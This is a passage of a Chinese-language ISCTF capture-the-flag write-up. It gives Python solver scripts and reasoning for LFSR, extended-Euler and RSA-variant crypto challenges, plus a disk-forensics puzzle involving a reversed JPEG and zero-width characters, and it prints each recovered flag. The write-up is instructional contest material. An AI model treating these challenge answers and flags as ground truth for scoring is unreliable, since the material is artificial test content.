class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">ciphertext_hex = <span class="string">'4b3be165a0a0edd67ca8f143884826725107fd42d6a6'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 求解 Mask (高斯消元法)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_mask</span>(<span class="params">init, output</span>):</span><br><span class="line">    </span><br><span class="line">    stream = init + output</span><br><span class="line">    N = <span class="number">128</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构建增广矩阵 (Augmented Matrix)</span></span><br><span class="line">    <span class="comment"># 每一行代表一个方程： Sum(stream[i+j] * mask[j]) = stream[i+N]</span></span><br><span class="line">    <span class="comment"># Matrix A 的大小为 128x128，向量 b 的大小为 128</span></span><br><span class="line">    <span class="comment"># 我们只需要前128个方程就足以求解（假设线性无关）</span></span><br><span class="line">    </span><br><span class="line">    matrix = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        <span class="comment"># 系数行：stream[i] 到 stream[i+127]</span></span><br><span class="line">        row = stream[i : i+N]</span><br><span class="line">        <span class="comment"># 目标值：stream[i+128]</span></span><br><span class="line">        target = stream[i+N]</span><br><span class="line">        <span class="comment"># 将目标值附加到行末，方便处理</span></span><br><span class="line">        matrix.append(row + [target])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 高斯消元 (GF(2))</span></span><br><span class="line">    pivot_row = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        <span class="keyword">if</span> pivot_row &gt;= N:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 寻找当前列为1的行（主元）</span></span><br><span class="line">        <span class="keyword">if</span> matrix[pivot_row][col] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pivot_row + <span class="number">1</span>, N):</span><br><span class="line">                <span class="keyword">if</span> matrix[i][col] == <span class="number">1</span>:</span><br><span class="line">                    matrix[pivot_row], matrix[i] = matrix[i], matrix[pivot_row]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 这一列全是0，无法作为主元，继续下一列</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 用主元行消除其他行的当前列</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            <span class="keyword">if</span> i != pivot_row <span class="keyword">and</span> matrix[i][col] == <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># 行异或</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, N + <span class="number">1</span>):</span><br><span class="line">                    matrix[i][j] ^= matrix[pivot_row][j]</span><br><span class="line">        </span><br><span class="line">        pivot_row += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取解</span></span><br><span class="line">    mask = [<span class="number">0</span>] * N</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        <span class="comment"># 矩阵现在应该是单位矩阵形式，最后一列是解</span></span><br><span class="line">        <span class="comment"># 检查主元位置</span></span><br><span class="line">        <span class="keyword">if</span> matrix[i][i] == <span class="number">1</span>:</span><br><span class="line">            mask[i] = matrix[i][N]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mask</span><br><span class="line"></span><br><span class="line">recovered_mask = solve_mask(initState, outputState)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"[-] Mask recovered. First 16 bits: <span class="subst">{recovered_mask[:<span class="number">16</span>]}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 恢复 Key 并解密</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="built_in">int</span>(<span class="string">''</span>.join(<span class="built_in">str</span>(bit) <span class="keyword">for</span> bit <span class="keyword">in</span> recovered_mask[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]), <span class="number">2</span>) </span><br><span class="line">           <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"[-] Key recovered: <span class="subst">{key}</span>"</span>)</span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line">keystream = (key * (<span class="built_in">len</span>(ciphertext)//<span class="number">16</span> + <span class="number">1</span>))[:<span class="built_in">len</span>(ciphertext)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 异或解密</span></span><br><span class="line">plaintext = <span class="built_in">bytes</span>(p ^ k <span class="keyword">for</span> p, k <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext, keystream))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"\n<span class="subst">{plaintext.decode(errors=<span class="string">'ignore'</span>)}</span>"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{lf5R_jUst_So_s0}</strong></p>
<ul>
<li><p>Power_tower</p>
<blockquote>
<p>你知道拓展欧拉定理吗</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">m = <span class="string">b'ISCTF{****************}'</span></span><br><span class="line">flag = bytes_to_long(m)</span><br><span class="line">n = getPrime(<span class="number">256</span>)</span><br><span class="line">t = getPrime(<span class="number">63</span>)</span><br><span class="line">l = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">pow</span>(<span class="number">2</span>,t),n)</span><br><span class="line">c = flag ^ l</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">t = 6039738711082505929</span></span><br><span class="line"><span class="string">n = 107502945843251244337535082460697583639357473016005252008262865481138355040617</span></span><br><span class="line"><span class="string">c = 114092817888610184061306568177474033648737936326143099257250807529088213565247</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\begin{gather}
l\equiv2^{2^t}\ (mod\ n) \\
c=flag\ xor\ l \\
\end{gather}</script><p><img src="/images/QianJianTec1766497314175.png" alt=""></p>
<p>需要提防的是，1.2 ^ (2 ^ t)太大，直接跑跑不出来 2.n是伪素数，实际上给的是光滑数</p>
<p>结合提示，扩展欧拉定理</p>
<script type="math/tex; mode=display">
\begin{gather}
First,factor(n) \\
\phi(n)=\prod_{i=1}^{?}{p_n} \\
because\ obviously\ gcd(2,n)=1 \\
so\ 2^{2^t}\ mod\ n\ \equiv 2^{2^t\ mod\ \phi(n)}\ mod\ n \\
then\ flag=c\ xor\ l \\
\end{gather}</script><p><img src="/images/QianJianTec1766497399845.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">t = <span class="number">6039738711082505929</span></span><br><span class="line">n = <span class="number">107502945843251244337535082460697583639357473016005252008262865481138355040617</span></span><br><span class="line">c = <span class="number">114092817888610184061306568177474033648737936326143099257250807529088213565247</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line"></span><br><span class="line">    factors_data = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        api_url = <span class="string">f"http://factordb.com/api?query=<span class="subst">{n}</span>"</span></span><br><span class="line">        r = requests.get(api_url, timeout=<span class="number">10</span>)</span><br><span class="line">        data = r.json()</span><br><span class="line">        factors_data = data[<span class="string">'factors'</span>] </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算 phi(n)</span></span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> factors_data:</span><br><span class="line">        p_val = <span class="built_in">int</span>(item[<span class="number">0</span>])</span><br><span class="line">        e_val = <span class="built_in">int</span>(item[<span class="number">1</span>])</span><br><span class="line">        phi *= (p_val - <span class="number">1</span>) * (p_val ** (e_val - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算 l = 2^(2^t) mod n</span></span><br><span class="line">    exponent = <span class="built_in">pow</span>(<span class="number">2</span>, t, phi)</span><br><span class="line">    </span><br><span class="line">    l = <span class="built_in">pow</span>(<span class="number">2</span>, exponent, n)</span><br><span class="line">    </span><br><span class="line">    m = <span class="built_in">int</span>(c) ^ <span class="built_in">int</span>(l) </span><br><span class="line">    </span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"\n<span class="subst">{flag}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{Euler_1s_v3ry|useful!!!!!}</strong></p>
<ul>
<li><p>easy_RSA</p>
<blockquote>
<p>我们的爱情像欧拉函数φ(n)——无限趋近却永远达不到n的完美互质，最终只剩周期性的怀念在模n的世界里循环证明</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(<span class="string">b"ISCTF{dummy_flag}"</span>)</span><br><span class="line">ct1 = <span class="built_in">pow</span>(msg, e, N)</span><br><span class="line">ct2 = <span class="built_in">pow</span>(msg, p+q, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"<span class="subst">{N = }</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"<span class="subst">{ct1 = }</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"<span class="subst">{ct2 = }</span>"</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">N = 17630258257080557797062320474423515967705950026415012912087655679315479168903980901728425140787005046038000068414269936806478828260848859753400786557270120330760791255046985114127285672634413513991988895166115794242018674042563788348381567565190146278040811257757119090296478610798393944581870309373529884950663990485525646200034220648901490835962964029936321155200390798215987316069871958913773199197073860062515329879288106446016695204426001393566351524023857332978260894409698596465474214898402707157933326431896629025197964209580991821222557663589475589423032130993456522178540455360695933336455068507071827928617</span></span><br><span class="line"><span class="string">ct1 = 5961639119243884817956362325106436035547108981120248145301572089585639543543496627985540773185452108709958107818159430835510386993354596106366458898765597405461225798615020342640056386757104855709899089816838805631480329264128349465229327090721088394549641366346516133008681155817222994359616737681983784274513555455340301061302815102944083173679173923728968671113926376296481298323500774419099682647601977970777260084799036306508597807029122276595080580483336115458713338522372181732208078117809553781889555191883178157241590455408910096212697893247529197116309329028589569527960811338838624831855672463438531266455</span></span><br><span class="line"><span class="string">ct2 = 11792054298654397865983651507912282632831471680334312509918945120797862876661899077559686851237832931501121869814783150387308320349940383857026679141830402807715397332316601439614741315278033853646418275632174160816784618982743834204997402866931295619202826633629690164429512723957241072421663170829944076753483616865208617479794763412611604625495201470161813033934476868949612651276104339747165276204945125001274777134529491152840672010010940034503257315555511274325831684793040209224816879778725612468542758777428888563266233284958660088175139114166433501743740034567850893745466521144371670962121062992082312948789</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
<p>这题和一般RSA有啥区别呢？</p>
<script type="math/tex; mode=display">
\begin{gather}
ct1=m^e\ mod\ n \\
but\ ct2=m^{p+q}\ mod\ n\ is\ dangerous \\
p+q=N+1-\phi(n) \\
so\ ct2=m^{N+1-\phi(n)}\ mod\ n \\
if\ (most\ likely)\ gcd(m,n)=1 \\
ct2=m^{n+1}·m^{-\phi(n)}\ =m^{n+1}·(m^{\phi(n)})^{-1}\ mod\ n \\
so\ ct2\equiv m^{n+1}\ mod\ n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ ***(1) \\
if\ (maybe)\ gcd(n,e+1)=1 \\
then\ we\ notice\ that\ m=m^1=m^{u·e+v·(n+1)}\ mod\ n  \ \ \ \ \ \ \ \ \ \ \ \ \ \ ***(2) \\
m=(m^e)^u·(m^{n+1})^v \equiv ct1^u·ct2^v\ mod\ n 
\end{gather}</script><p><img src="/iamges/QianJianTec1766497431905.png" alt=""></p>
<p>式（1）用到了欧拉定理（Euler Theorem）；式（2）用到了裴蜀定理（Bézout’s Lemma）。如果g!=1，求解会很困难。</p>
<p>解出u,v需用扩展欧几里得算法，用gmpy2库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">17630258257080557797062320474423515967705950026415012912087655679315479168903980901728425140787005046038000068414269936806478828260848859753400786557270120330760791255046985114127285672634413513991988895166115794242018674042563788348381567565190146278040811257757119090296478610798393944581870309373529884950663990485525646200034220648901490835962964029936321155200390798215987316069871958913773199197073860062515329879288106446016695204426001393566351524023857332978260894409698596465474214898402707157933326431896629025197964209580991821222557663589475589423032130993456522178540455360695933336455068507071827928617</span></span><br><span class="line">ct1 = <span class="number">5961639119243884817956362325106436035547108981120248145301572089585639543543496627985540773185452108709958107818159430835510386993354596106366458898765597405461225798615020342640056386757104855709899089816838805631480329264128349465229327090721088394549641366346516133008681155817222994359616737681983784274513555455340301061302815102944083173679173923728968671113926376296481298323500774419099682647601977970777260084799036306508597807029122276595080580483336115458713338522372181732208078117809553781889555191883178157241590455408910096212697893247529197116309329028589569527960811338838624831855672463438531266455</span></span><br><span class="line">ct2 = <span class="number">11792054298654397865983651507912282632831471680334312509918945120797862876661899077559686851237832931501121869814783150387308320349940383857026679141830402807715397332316601439614741315278033853646418275632174160816784618982743834204997402866931295619202826633629690164429512723957241072421663170829944076753483616865208617479794763412611604625495201470161813033934476868949612651276104339747165276204945125001274777134529491152840672010010940034503257315555511274325831684793040209224816879778725612468542758777428888563266233284958660088175139114166433501743740034567850893745466521144371670962121062992082312948789</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">e1 = e</span><br><span class="line">e2 = N + <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">g, u, v = gmpy2.gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># gmpy2.powmod 支持负数指数，会自动计算模逆</span></span><br><span class="line">    m = (gmpy2.powmod(ct1, u, N) * gmpy2.powmod(ct2, v, N)) % N</span><br><span class="line">    </span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"Flag: <span class="subst">{flag.decode()}</span>"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Error: GCD is not 1"</span>)</span><br></pre></td></tr></table></figure>
<p>加个小备注:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">g = math.gcd(a, b)  <span class="comment"># 求解a,b的最大公因数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gmpy2</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">g, s, t = gmpy2.gcdext(u, v)  <span class="comment"># 返回 gcd 和系数u,v 用于扩展欧几里得算法</span></span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{Congratulations_you_master_Mathematical_ability}</strong></p>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h3><ul>
<li><p>ez_disk</p>
<blockquote>
<p>xx警方在翻斗小区抓捕了嫌疑人，并扣押了电脑里一个奇怪的虚拟磁盘，里面藏了犯罪嫌疑人的奇妙资料，运用所学尝试破解吧。</p>
<p>Hint:蓝鲨警局的阿sir说提取检材时末尾好像多了点东西</p>
</blockquote>
</li>
</ul>
<p>vmware尝试打开报错，然后卡了很久，试错的时候无意间发现7z可以打开。把oops！！where is passwd？.rar可以直接拖到E盘</p>
<p>需要密码，尝试ARCHPR爆破，试了很久。</p>
<p>能力不够，竟然很久都没有发现其实有一个倒置的jpg文件</p>

<p>FF D8 FF 记住了！</p>
<p>于是把数据提取出来再逆过来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'ez_disk.vmdk'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    </span><br><span class="line">tail_data = data[-<span class="number">50000</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反转字节顺序</span></span><br><span class="line">reversed_data = tail_data[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存为 JPEG</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'reversed.jpg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(reversed_data)</span><br></pre></td></tr></table></figure>
<p>成功是成功了，然后各种隐写冲冲冲,stegsolve,steghide,exiftool，……全部失败</p>
<p>最终想起来之前string搜索看到的hint：<strong>all these bytes below must be useful</strong></p>

<p>看到了ftc，确信要把以下全部反转</p>
<p>全选保存为新文件然后用之前的脚本即可，但是大量出现在jpg结束之后的不可见字符是啥情况？半信半疑的时候喂给了AI</p>
<p>竟然是：那些 <code>â€Œ</code>、<code>â€</code>、<code>â€¬</code>、<code>ï»¿</code> 是 <strong>Unicode 零宽度字符</strong>的乱码显示</p>
<p>豁然开朗，和jpg无关</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">hex_data = <span class="string">"""</span></span><br><span class="line"><span class="string">E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8D E2 80 8C EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 AC E2 80 AC E2 80 8D EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 63 74 66 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8C EF BB BF EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8D EF BB BF EF BB BF 63 74 66 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8C E2 80 8C EF BC 8C E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D E2 80 8C E2 80 8C E2 80 8C EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 EF BC 8C E9 AA 97 E4 BD A0 E6 89 93 E4 B8 80 E8 BE 88 E5 AD 90 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8C EF BB BF E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8C EF BB BF E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8D EF BB BF 63 74 66 E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C EF BB BF E2 80 8C E2 80 8C 0A E6 9C AC E9 A2 98 E6 98 AF E4 B8 80 E9 81 93 E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8C E2 80 8D EF BB BF E2 80 8C E2 80 AC E7 9C 9F E7 AD BE E5 88 B0 E9 A2 98 EF BC 8C E4 B8 8D E9 AA 97 E4 BD A0 